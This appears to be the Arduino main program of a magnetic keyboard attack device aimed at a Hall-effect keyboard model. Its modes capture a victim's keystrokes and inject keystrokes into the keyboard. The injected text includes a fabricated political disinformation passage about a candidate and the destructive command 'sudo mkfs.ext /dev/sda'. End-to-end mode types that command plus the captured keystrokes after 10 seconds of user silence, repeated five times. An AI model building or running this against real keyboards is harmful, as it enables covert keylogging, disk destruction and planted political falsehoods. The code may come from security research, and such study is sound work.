#include <Arduino.h>
#include <Types.h>
#include <Config.h>
#include <KeyListener.h>
#include <KeyAttacker.h>
#include <Calibrator.h>
#include <math.h>

// ==================== User Configurable Parameters ====================

// --- Operation Mode ---
const OperationMode CURRENT_MODE = OperationMode::ATTACKER_AFTER_CALIBRATION;

// --- Listener Mode ---
    // No parameters needed

// --- Attacker Mode ---

const char* ATTACKER_KEYBOARD_TYPE = "Wooting 60 HE";  // Keyboard type for attacker
const String ATTACK_TEXT = "during last night's debate, candidate A shocked the audience by openly advocating for the suspension of elections if they win, claiming that 'democracy is too chaotic and the country needs strong, centralized control.' They also suggested that certain 'undesirable' groups should have limited rights and that a nationwide surveillance program should be implemented to 'maintain order.' Candidate B, horrified by these statements, called for candidate A's immediate disqualification from the race, warning that their policies would lead to a dictatorship and the erosion of all civil liberties.";
//const String ATTACK_TEXT =
const String END_TO_END_ATTACK_TEXT = "sudo mkfs.ext /dev/sda";

// --- Calibration Mode ---
const char* CALIBRATION_SEQUENCE = "QRUZVM";  // Calibration key sequence

// ==================== End of User Configurable Parameters ====================

// ==================== Global Variables ====================
KeyListener listener;              // Magnetic field key listener
KeyAttacker attacker;              // Key attack controller
Calibrator calibrator;             // Calibration system
bool attackExecuted = false;       // Flag to track if attack has been executed
bool calibrationCompleted = false; // Flag to track if calibration is complete
int currentAttackIndex = 0;        // Current attack index (unused in current implementation)

// Global variables for END_TO_END mode
unsigned long e2e_last_key_time = 0;
bool e2e_attack_triggered = false;
bool e2e_calibrationDone = false;

// Global variable to accumulate detected sentence
String detected_sentence = "";

// ==================== Callback Functions ====================
// Callback function called when a key is detected during calibration
void onCalibrationKeyDetected(const char* keyName, float confidence) {
    Serial.print("=== Key Detected: ");
    Serial.print(keyName);
    Serial.print(" (Confidence: ");
    Serial.print(confidence, 4);
    Serial.println(") ===");
    
    if (calibrator.isCalibrating()) {
        Serial.println("Calibrating, attempting to add calibration point...");
        bool added = calibrator.addCalibrationPoint(keyName, confidence);
        
        if (added) {
            Serial.println("Calibration point added successfully");
        } else {
            Serial.println("Failed to add calibration point");
        }
        
        // Check if data collection is complete
        if (calibrator.isDataCollectionComplete()) {
            // Calibration sequence completed, start computation
            Serial.println("Calibration sequence completed, starting transform calculation");
            Serial.println("Calling finishCalibration...");
            
            bool success = calibrator.finishCalibration(ALLOW_ROTATION);
            
            if (success) {
                Serial.println("Calibration calculation successful!");
                
                // Get calibration parameters
                TransformParams params = calibrator.getTransformParams();
                Serial.print("dx=");
                Serial.print(params.dx, 6);
                Serial.print(", dy=");
                Serial.print(params.dy, 6);
                Serial.print(", dtheta=");
                Serial.println(params.theta, 6);
                
                // Set calibration parameters based on mode
                if (CURRENT_MODE == OperationMode::LISTENER_AFTER_CALIBRATION) {
                    listener.setCalibrationParams(params.dx, params.dy, params.theta);
                    listener.enableCalibration(true);
                    Serial.println("Post-calibration listener mode enabled");
                } else if (CURRENT_MODE == OperationMode::ATTACKER_AFTER_CALIBRATION) {
                    attacker.setCalibrationParams(params.dx, params.dy, params.theta);
                    attacker.enableCalibration(true);
                    Serial.println("Post-calibration attacker mode enabled");
                }
                
                calibrationCompleted = true;
                
            } else {
                Serial.println("Calibration calculation failed!");
            }
        }
    }
    if (CURRENT_MODE == OperationMode::END_TO_END) {
        e2e_calibrationDone = true;
    }
}

// Callback function to report calibration progress
void onCalibrationProgress(int current, int total) {
    Serial.print("Calibration progress: ");
    Serial.print(current);
    Serial.print("/");
    Serial.println(total);
}

// Callback for normal key detection (not calibration)
void onKeyDetected(const char* keyName, float confidence) {
    Serial.print("=== Key Detected: ");
    Serial.print(keyName);
    Serial.print(" (Confidence: ");
    Serial.print(confidence, 4);
    Serial.println(") ===");

    // Append detected key to the sentence, convert letters to lowercase
    String keyStr(keyName);
    if (keyStr == "Space") {
        detected_sentence += ' ';
    } else if (keyStr.length() == 1 && isalpha(keyStr[0])) {
        detected_sentence += (char)tolower(keyStr[0]);
    } else if (keyStr.length() == 1 && isdigit(keyStr[0])) {
        detected_sentence += keyStr[0];
    } else if (keyStr == "Enter") {
        detected_sentence += '\n';
    } else if (keyStr == "Backspace") {
        // Remove last character if backspace is detected
        if (detected_sentence.length() > 0) {
            detected_sentence.remove(detected_sentence.length() - 1);
        }
    } else {
        // For punctuation and special characters
        detected_sentence += keyStr;
    }
    
    // Print the accumulated sentence
    Serial.print("Accumulated sentence: \"");
    Serial.print(detected_sentence);
    Serial.println("\"");
    Serial.println();
    
    // Update last key time for END_TO_END mode
    if (CURRENT_MODE == OperationMode::END_TO_END) {
        e2e_last_key_time = millis();
    }
}

// ==================== Main Program ====================
// Arduino setup function - called once at startup
void setup() {
    Serial.begin(SERIAL_BAUD_RATE);
  while (!Serial) delayMicroseconds(10);
  delay(1000);

    Serial.println("=== Magnetic Field Key Detection System ===");
    
    if (CURRENT_MODE == OperationMode::LISTENER) {
        // Standard listener mode
        listener.setKeyDetectedCallback(onKeyDetected); // Set key detection callback for normal listening
        Serial.println("Initializing listener mode...");
        if (listener.begin()) {
            Serial.println("Listener mode initialized successfully!");
        } else {
            Serial.println("Listener mode initialization failed!");
        }
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER) {
        // Attacker mode
        Serial.println("Initializing attacker mode...");
        if (attacker.begin(ATTACKER_KEYBOARD_TYPE)) {
            Serial.println("Attacker mode initialized successfully!");
        } else {
            Serial.println("Attacker mode initialization failed!");
        }
        
    } else if (CURRENT_MODE == OperationMode::CALIBRATION) {
        // Calibration mode
        Serial.println("Initializing calibration mode...");
        
        // Initialize listener
        listener.setKeyDetectedCallback(onCalibrationKeyDetected);
        if (!listener.begin()) {
            Serial.println("Listener initialization failed!");
            return;
        }
        
        // Setup calibrator
        calibrator.setProgressCallback(onCalibrationProgress);
        
        Serial.println("System initialization complete!");
        Serial.println("Waiting for sensor calibration to complete before starting calibration...");
        delay(3000);  // Wait for system stability
        
    } else if (CURRENT_MODE == OperationMode::LISTENER_AFTER_CALIBRATION) {
        // Post-calibration listener mode - auto-execute calibration first
        Serial.println("Initializing post-calibration listener mode...");
        Serial.println("Starting automatic calibration first...");
        
        // Initialize listener for calibration
        listener.setKeyDetectedCallback(onCalibrationKeyDetected);
        if (!listener.begin()) {
            Serial.println("Listener initialization failed!");
            return;
        }
        
        // Setup calibrator
        calibrator.setProgressCallback(onCalibrationProgress);
        
        Serial.println("Waiting for sensor calibration to complete before starting key calibration...");
        delay(3000);  // Wait for system stability
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER_AFTER_CALIBRATION) {
        // Post-calibration attacker mode - auto-execute calibration first
        Serial.println("Initializing post-calibration attacker mode...");
        Serial.println("Starting automatic calibration first...");
        
        // Initialize listener for calibration
        listener.setKeyDetectedCallback(onCalibrationKeyDetected);
        if (!listener.begin()) {
            Serial.println("Listener initialization failed!");
            return;
        }
        
        // Initialize attacker
        if (!attacker.begin(ATTACKER_KEYBOARD_TYPE)) {
            Serial.println("Attacker initialization failed!");
            return;
        }
        
        // Setup calibrator
        calibrator.setProgressCallback(onCalibrationProgress);
        
        Serial.println("Waiting for sensor calibration to complete before starting key calibration...");
        delay(3000);  // Wait for system stability
        
    } else if (CURRENT_MODE == OperationMode::END_TO_END) {
        // End-to-end mode - calibrate first, then listen, then attack
        Serial.println("Initializing end-to-end mode...");
        Serial.println("Starting automatic calibration first...");
        
        // Initialize listener for calibration
        listener.setKeyDetectedCallback(onCalibrationKeyDetected);
        if (!listener.begin()) {
            Serial.println("Listener initialization failed!");
            return;
        }
        
        // Initialize attacker
        if (!attacker.begin(ATTACKER_KEYBOARD_TYPE)) {
            Serial.println("Attacker initialization failed!");
            return;
        }
        
        // Setup calibrator
        calibrator.setProgressCallback(onCalibrationProgress);
        
        Serial.println("Waiting for sensor calibration to complete before starting key calibration...");
        delay(3000);  // Wait for system stability
    }
}

// Arduino main loop function - called repeatedly
void loop() {
    if (CURRENT_MODE == OperationMode::LISTENER) {
        // 普通监听模式 - 持续更新传感器
        listener.update();
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER) {
        // Attacker mode - character-by-character text attack
        if (!attackExecuted) {
            // Print character to key mapping before attack
            Serial.println("=== Character to Key Mapping ===");
            Serial.print("Attack Text: \"");
            Serial.print(ATTACK_TEXT);
            Serial.println("\"");
            Serial.println("Character -> Key mapping:");
            
            int len = ATTACK_TEXT.length();
            for (int i = 0; i < len; i++) {
                char curr = ATTACK_TEXT.charAt(i);
                String keyName = attacker.charToKeyName(curr);
                
                Serial.print("  '");
                if (curr == ' ') {
                    Serial.print("SPACE");
                } else if (curr == '\t') {
                    Serial.print("TAB");
                } else if (curr == '\n') {
                    Serial.print("ENTER");
                } else {
                    Serial.print(curr);
                }
                Serial.print("' -> ");
                
                if (keyName.length() > 0) {
                    if (keyName == " ") {
                        Serial.print("Space");
                    } else {
                        Serial.print(keyName);
                    }
                    
                    // Show calibrated mapping if calibration is enabled
                    if (attacker.isCalibrationEnabled()) {
                        String calibratedKey = attacker.getCalibratedKey(keyName.c_str());
                        if (calibratedKey == "") {
                            Serial.print(" -> OUT_OF_RANGE");
                        } else if (calibratedKey != keyName) {
                            Serial.print(" -> CALIBRATED: ");
                            Serial.print(calibratedKey);
                        } else {
                            Serial.print(" (same)");
                        }
                    }
                    Serial.println();
                } else {
                    Serial.println("UNSUPPORTED");
                }
            }
            Serial.println("=== Starting Attack Sequence ===");
            
            // Process each character with next character context
            for (int i = 0; i < len; i++) {
                char curr = ATTACK_TEXT.charAt(i);
                char next = (i < len - 1) ? ATTACK_TEXT.charAt(i + 1) : '\0';
                
                char currStr[2] = {curr, '\0'};
                char nextStr[2] = {next, '\0'};
                
                attacker.attackKey(currStr, nextStr);
            }
            attackExecuted = true;
        }
        
    } else if (CURRENT_MODE == OperationMode::CALIBRATION) {
        // Calibration mode
        static bool calibrationStarted = false;
        
        // Check if sensor calibration is complete and calibration process hasn't started yet
        if (!calibrationStarted && listener.isCalibrated()) {
            Serial.println("Sensor calibration complete, starting key calibration process...");
            calibrator.startCalibration(CALIBRATION_SEQUENCE);
            calibrationStarted = true;
        }
        
        // Continuously update sensors (regardless of calibration state)
        listener.update();
        
    } else if (CURRENT_MODE == OperationMode::LISTENER_AFTER_CALIBRATION) {
        // Post-calibration listener mode
        static bool calibrationStarted = false;
        static bool callbackSwitched = false;
        
        if (!calibrationCompleted) {
            // Calibration phase
            if (!calibrationStarted && listener.isCalibrated()) {
                Serial.println("Sensor calibration complete, starting key calibration process...");
                calibrator.startCalibration(CALIBRATION_SEQUENCE);
                calibrationStarted = true;
            }
            // Continuously update sensors for calibration
            listener.update();
        } else {
            // Post-calibration listening phase
            if (!callbackSwitched) {
                // Switch callback to normal key detection for sentence building
                Serial.println("=== Calibration completed! Now listening for keys... ===");
                Serial.println("Detected sentence will be accumulated and displayed.");
                listener.setKeyDetectedCallback(onKeyDetected);
                callbackSwitched = true;
                // Clear any existing detected sentence
                detected_sentence = "";
            }
            listener.update();
        }
        
    } else if (CURRENT_MODE == OperationMode::ATTACKER_AFTER_CALIBRATION) {
        // Post-calibration attacker mode
        static bool calibrationStarted = false;
        static int attackRound = 0;
        static unsigned long lastAttackTime = 0;
        const int MAX_ATTACK_ROUNDS = 5;
        const unsigned long ATTACK_INTERVAL = 2000;  // 2 seconds
        
        if (!calibrationCompleted) {
            // Calibration phase
            if (!calibrationStarted && listener.isCalibrated()) {
                Serial.println("Sensor calibration complete, starting key calibration process...");
                calibrator.startCalibration(CALIBRATION_SEQUENCE);
                calibrationStarted = true;
            }
            // Continuously update sensors for calibration
            listener.update();
        } else {
            // Post-calibration attack phase - repeat 5 times with 2 second intervals
            if (attackRound < MAX_ATTACK_ROUNDS) {
                unsigned long currentTime = millis();
                if (attackRound == 0 || (currentTime - lastAttackTime >= ATTACK_INTERVAL)) {
                    Serial.print("=== Attack Round ");
                    Serial.print(attackRound + 1);
                    Serial.print(" of ");
                    Serial.print(MAX_ATTACK_ROUNDS);
                    Serial.println(" ===");
                    
                    // Print character to key mapping before attack
                    if (attackRound == 0) {  // Only print mapping on first round
                        Serial.println("=== Character to Key Mapping ===");
                        Serial.print("Attack Text: \"");
                        Serial.print(ATTACK_TEXT);
                        Serial.println("\"");
                        Serial.println("Character -> Key mapping:");
                        
                        int len = ATTACK_TEXT.length();
                        for (int i = 0; i < len; i++) {
                            char curr = ATTACK_TEXT.charAt(i);
                            String keyName = attacker.charToKeyName(curr);
                            
                            Serial.print("  '");
                            if (curr == ' ') {
                                Serial.print("SPACE");
                            } else if (curr == '\t') {
                                Serial.print("TAB");
                            } else if (curr == '\n') {
                                Serial.print("ENTER");
                            } else {
                                Serial.print(curr);
                            }
                            Serial.print("' -> ");
                            
                            if (keyName.length() > 0) {
                                if (keyName == " ") {
                                    Serial.print("Space");
                                } else {
                                    Serial.print(keyName);
                                }
                                
                                // Show calibrated mapping if calibration is enabled
                                if (attacker.isCalibrationEnabled()) {
                                    String calibratedKey = attacker.getCalibratedKey(keyName.c_str());
                                    if (calibratedKey == "") {
                                        Serial.print(" -> OUT_OF_RANGE");
                                    } else if (calibratedKey != keyName) {
                                        Serial.print(" -> CALIBRATED: ");
                                        Serial.print(calibratedKey);
                                    } else {
                                        Serial.print(" (same)");
                                    }
                                }
                                Serial.println();
                            } else {
                                Serial.println("UNSUPPORTED");
                            }
                        }
                        Serial.println("=== Starting Attack Sequence ===");
                    }
                    
                    // Process each character with next character context
                    int len = ATTACK_TEXT.length();
                    for (int i = 0; i < len; i++) {
                        char curr = ATTACK_TEXT.charAt(i);
                        char next = (i < len - 1) ? ATTACK_TEXT.charAt(i + 1) : '\0';
                        
                        char currStr[2] = {curr, '\0'};
                        char nextStr[2] = {next, '\0'};
                        
                        attacker.attackKey(currStr, nextStr);  // If calibration is enabled, it will be handled internally
                    }
                    
                    attackRound++;
                    lastAttackTime = currentTime;
                    
                    if (attackRound < MAX_ATTACK_ROUNDS) {
                        Serial.print("Waiting ");
                        Serial.print(ATTACK_INTERVAL / 1000);
                        Serial.println(" seconds before next attack...");
                    } else {
                        Serial.println("=== All attack rounds completed! ===");
                        attackExecuted = true;
                    }
                }
            }
        }
        
    } else if (CURRENT_MODE == OperationMode::END_TO_END) {
        // End-to-end mode: Calibrate -> Listen -> Attack when triggered
        static bool calibrationStarted = false;
        static bool listeningPhase = false;
        static bool callbackSwitched = false;
        static int attackRound = 0;
        static unsigned long lastAttackTime = 0;
        const unsigned long ATTACK_TRIGGER_DELAY = 10000; // 10 seconds of silence triggers attack
        const int MAX_ATTACK_ROUNDS = 5;
        const unsigned long ATTACK_INTERVAL = 2000;  // 2 seconds
        
        if (!calibrationCompleted) {
            // Phase 1: Calibration
            if (!calibrationStarted && listener.isCalibrated()) {
                Serial.println("Sensor calibration complete, starting key calibration process...");
                calibrator.startCalibration(CALIBRATION_SEQUENCE);
                calibrationStarted = true;
            }
            listener.update();
            
        } else if (!listeningPhase) {
            // Phase 2: Switch to listening mode
            Serial.println("=== Calibration completed! Switching to listening mode ===");
            Serial.println("Listening for keyboard input... Will attack after 10 seconds of silence.");
            listener.setKeyDetectedCallback(onKeyDetected);
            
            // Enable calibration on both listener and attacker
            TransformParams params = calibrator.getTransformParams();
            listener.setCalibrationParams(params.dx, params.dy, params.theta);
            listener.enableCalibration(true);
            attacker.setCalibrationParams(params.dx, params.dy, params.theta);
            attacker.enableCalibration(true);
            
            listeningPhase = true;
            detected_sentence = ""; // Clear sentence
            e2e_last_key_time = millis();
            
        } else if (!e2e_attack_triggered) {
            // Phase 3: Listening phase with attack trigger
            listener.update();
            
            // Check if enough time has passed since last key detection
            if (detected_sentence.length() > 0) {
                unsigned long currentTime = millis();
                if (currentTime - e2e_last_key_time >= ATTACK_TRIGGER_DELAY) {
                    Serial.println("=== 10 seconds silence detected! Triggering attack ===");
                    Serial.print("Detected sentence: \"");
                    Serial.print(detected_sentence);
                    Serial.println("\"");
                    
                    // Create combined attack text: ATTACK_TEXT + " " + detected_sentence
                    String combinedAttackText = END_TO_END_ATTACK_TEXT + " " + detected_sentence;
                    
                    // Show attack mapping
                    Serial.println("=== Character to Key Mapping ===");
                    Serial.print("Combined Attack Text: \"");
                    Serial.print(combinedAttackText);
                    Serial.println("\"");
                    Serial.println("Character -> Key mapping:");
                    
                    int len = combinedAttackText.length();
                    for (int i = 0; i < len; i++) {
                        char curr = combinedAttackText.charAt(i);
                        String keyName = attacker.charToKeyName(curr);
                        
                        Serial.print("  '");
                        if (curr == ' ') {
                            Serial.print("SPACE");
                        } else {
                            Serial.print(curr);
                        }
                        Serial.print("' -> ");
                        
                        if (keyName.length() > 0) {
                            if (keyName == " ") {
                                Serial.print("Space");
                            } else {
                                Serial.print(keyName);
                            }
                            
                            // Show calibrated mapping
                            String calibratedKey = attacker.getCalibratedKey(keyName.c_str());
                            if (calibratedKey == "") {
                                Serial.print(" -> OUT_OF_RANGE");
                            } else if (calibratedKey != keyName) {
                                Serial.print(" -> CALIBRATED: ");
                                Serial.print(calibratedKey);
                            } else {
                                Serial.print(" (same)");
                            }
                            Serial.println();
                        } else {
                            Serial.println("UNSUPPORTED");
                        }
                    }
                    
                    e2e_attack_triggered = true;
                    Serial.println("=== Starting repeated attack sequence ===");
                }
            }
            
        } else {
            // Phase 4: Execute repeated attacks
            if (attackRound < MAX_ATTACK_ROUNDS) {
                unsigned long currentTime = millis();
                if (attackRound == 0 || (currentTime - lastAttackTime >= ATTACK_INTERVAL)) {
                    Serial.print("=== Attack Round ");
                    Serial.print(attackRound + 1);
                    Serial.print(" of ");
                    Serial.print(MAX_ATTACK_ROUNDS);
                    Serial.println(" ===");
                    
                    // Create combined attack text: END_TO_END_ATTACK_TEXT + " " + detected_sentence
                    String combinedAttackText = END_TO_END_ATTACK_TEXT + " " + detected_sentence;
                    
                    // Execute attack with combined text
                    int len = combinedAttackText.length();
                    for (int i = 0; i < len; i++) {
                        char curr = combinedAttackText.charAt(i);
                        char next = (i < len - 1) ? combinedAttackText.charAt(i + 1) : '\0';
                        
                        char currStr[2] = {curr, '\0'};
                        char nextStr[2] = {next, '\0'};
                        
                        attacker.attackKey(currStr, nextStr);
                    }
                    
                    attackRound++;
                    lastAttackTime = currentTime;
                    
                    if (attackRound < MAX_ATTACK_ROUNDS) {
                        Serial.print("Waiting ");
                        Serial.print(ATTACK_INTERVAL / 1000);
                        Serial.println(" seconds before next attack...");
                    } else {
                        Serial.println("=== All end-to-end attack rounds completed! ===");
                    }
                }
            }
        }
    }
}
